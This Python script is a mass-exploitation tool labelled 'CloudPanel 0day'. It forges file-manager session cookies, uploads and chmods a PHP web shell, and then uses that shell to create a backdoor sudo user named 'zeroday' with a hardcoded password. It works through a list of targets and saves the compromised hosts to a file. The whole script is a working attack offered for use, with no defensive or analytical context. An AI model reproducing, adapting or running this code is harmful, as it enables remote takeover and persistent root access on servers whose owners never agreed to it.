import subprocess
import argparse
import warnings
import os
import sys
import ctypes
import platform
import requests
from colorama import Fore, Back, Style
from datetime import date

warnings.filterwarnings('ignore')

cmd = '/usr/bin/php8.2 Crypto.php'
default_path = '/file-manager/'
parser = argparse.ArgumentParser()
username = 'clp'
tgt = ''

# Use for automatically add new user with sudo privileges
user_add = "useradd zeroday -s /bin/bash -b /tmp"
user_passwd = "echo 'Etharus@1337%0AEtharus@1337' | passwd zeroday"
user_mod = "usermod -aG sudo zeroday"

gains = ["sudo su -c '" + user_add + "'", 'sudo su -c "' + user_passwd + '"', "sudo su -c '" + user_mod + "'"]

# List to store successful targets with webshell and SSH login results
success_targets = []


def execPHP(txt=False):
    global cmd
    returned_output = ''
    if not txt:
        proc = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE)
        returned_output = proc.stdout.read().decode('utf-8')
    else:
        cmd = cmd + ' ' + txt
        proc = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE)
        returned_output = proc.stdout.read().decode('utf-8')
    return returned_output


def exploit(target):
    global default_path, username, success_targets
    target = 'https://' + target.replace('/', '')
    ipTarget = target.split(':')[0]
    crypto = execPHP()
    cookie = {'clp-fm': crypto}
    try:
        request = requests.get(target + default_path, cookies=cookie, verify=False, timeout=5)
        if request.status_code == 200:
            up_data = {'id': '/htdocs/app/files/public/', 'name': 'shell.php'}
            new_ck = {'clp-fm': execPHP(username)}
            try:
                new_request = requests.post(target + default_path + 'backend/makefile', cookies=new_ck, data=up_data,
                                            verify=False, timeout=5)
                if new_request.status_code == 200:
                    cdata = {'id': '/htdocs/app/files/public/shell.php',
                             'content': open('shell.php', 'rb').read()}
                    try:
                        crequest = requests.post(target + default_path + 'backend/text', cookies=new_ck, data=cdata,
                                                 verify=False, timeout=5)
                        if crequest.status_code == 200:
                            pdata = {'id': '/htdocs/app/files/public/shell.php', 'permissions': '0777'}
                            try:
                                prequest = requests.post(target + default_path + 'backend/permissions', cookies=new_ck,
                                                         data=pdata, verify=False, timeout=5)
                                if prequest.status_code == 200:
                                    shell_check = requests.get(target + '/shell.php', verify=False, timeout=5)
                                    if shell_check.status_code == 200:
                                        webshell_result = '[+] WebShell : ' + target + '/shell.php'
                                        ssh_login_result = '[+] SSH Login : user=zeroday,pass=Etharus@1337'
                                        print(Style.BRIGHT + Fore.GREEN + webshell_result)
                                        for gain in gains:
                                            requests.get(target + '/shell.php?cmd=' + gain, verify=False, timeout=10)
                                        print(Style.BRIGHT + Fore.GREEN + ssh_login_result)
                                        # Append successful target with results to the list
                                        success_targets.append(target + ' ' + webshell_result + ' ' + ssh_login_result)
                            except:
                                print(Style.BRIGHT + Fore.RED + 'Connection error while changing permission!')
                    except:
                        print(Style.BRIGHT + Fore.RED + 'Connection error while trying insert contents!')
            except:
                print(Style.BRIGHT + Fore.RED + 'Connection error while trying creating file!')
        else:
            print(Style.BRIGHT + Fore.RED + 'Not Vulnerable...')
    except:
        print(Style.BRIGHT + Fore.RED + 'Connection error!')


def StartPage():
    global tgt, prt
    parser.add_argument('-T', '--target', dest='tgt', type=str, help='Ex: 127.0.0.1:8443', default=None, required=False)
    parser.add_argument('-f', '--file', dest='tgt_file', type=str, help='File containing list of targets', default=None, required=False)
    args = parser.parse_args()

    if args.tgt:
        tgt = args.tgt
        exploit(tgt)
    elif args.tgt_file:
        tgt_file = args.tgt_file
        with open(tgt_file, 'r') as file:
            targets = file.read().splitlines()
            for target in targets:
                exploit(target)
    else:
        print(Style.BRIGHT + Fore.RED + 'Error: Specify either a single target using -T or a file containing targets using -f')
        parser.print_help()

    # Write successful targets with webshell and SSH login results to the file
    with open('success.txt', 'w') as success_file:
        success_file.write('\n'.join(success_targets))


if __name__ == '__main__':
    today = date.today()
    d2 = today.strftime("%B %d, %Y")

    if platform.system() == 'Linux':
        os.system('clear')
        sys.stdout.write("\x1b]2;CLP 0Day {}\x07".format(d2))
    else:
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'CLP 0Day | {d2}')

    print(f"""{Style.BRIGHT + Fore.GREEN}

                                ______      _____             _____ __   _          
                               / ____/___ _/ / (_)___  ____ _/ ___// /__(_)__  _____
                              / /_  / __ `/ / / / __ \/ __ `/\__ \/ //_/ / _ \/ ___/
                             / __/ / /_/ / / / / / / / /_/ /___/ / ,< / /  __(__  ) 
                            /_/    \__,_/_/_/_/_/ /_/\__, //____/_/|_/_/\___/____/  
                                                    /____/  CloudPanel 0day Version : 2.0.0 >= 2.3.0                        
                                                            
    {Style.BRIGHT + Fore.MAGENTA}
                                        ░█▀▄░█▀█░▀█▀░█▀█░█▀▀░█░█░░░░█▄█░█░█
                                        ░█░█░█▀█░░█░░█▀█░█░░░█▀▄░░░░█░█░░█░
                                        ░▀▀░░▀░▀░░▀░░▀░▀░▀▀▀░▀░▀░▀░░▀░▀░░▀░
    {Style.BRIGHT + Fore.WHITE}""")
    StartPage()

